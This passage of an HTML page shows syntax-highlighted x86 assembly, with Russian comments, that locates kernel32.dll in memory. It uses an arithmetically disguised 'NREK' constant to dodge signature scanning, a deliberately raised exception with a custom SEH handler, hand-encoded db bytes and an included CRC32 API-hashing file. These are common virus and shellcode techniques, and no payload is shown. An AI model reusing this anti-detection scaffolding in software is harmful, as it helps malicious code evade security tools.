         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc5">Name_RVA</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
         </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">                              </span><span class="sc1">; edi=Имя модуля.</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,(</span><span class="sc12">'NREK'</span><span class="sc4">-</span><span class="sc2">11223344h</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc1">; KERN</span><span class="sc0">
         </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc2">11223344h</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc8">edx</span><span class="sc0">
         </span><span class="sc5">jne_</span><span class="sc0"> </span><span class="sc5">GdeMZK32</span><span class="sc0">              </span><span class="sc1">; Ищем дальше ... кто ищет тот ...</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">                    </span><span class="sc1">; EDI= Kernel32 Handler</span><span class="sc0">

         </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">fs</span><span class="sc4">:[</span><span class="sc8">edx</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">


         </span><span class="sc5">rEDI_</span><span class="sc0"> </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
         </span><span class="sc5">rESI_</span><span class="sc0"> </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc5">rEDI_</span><span class="sc4">],</span><span class="sc8">edi</span><span class="sc0">
         </span><span class="sc6">popa</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">fs</span><span class="sc0">
         </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">GetKernelHahdler</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">fs</span><span class="sc4">:[</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">fs</span><span class="sc4">:[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc8">esp</span><span class="sc0">
         </span><span class="sc1">; Генерируем исключение</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc1">;-------------------------------------------------</span><span class="sc0">
</span><span class="sc5">MySEH</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">fs</span><span class="sc4">:[</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">fs</span><span class="sc4">:[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc8">esp</span><span class="sc0">       </span><span class="sc1">;</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">

         </span><span class="sc1">;add eax,RetEDISize+1</span><span class="sc0">
         </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">083h</span><span class="sc4">,</span><span class="sc2">0c0h</span><span class="sc0">
         </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc5">RetEDISize</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc0">

         </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc9">include</span><span class="sc0"> </span><span class="sc5">crc32api.inc</span><span class="sc0">
</span><span class="sc1">;--------------------------------------------------------------------------</span></div></body>
</html>
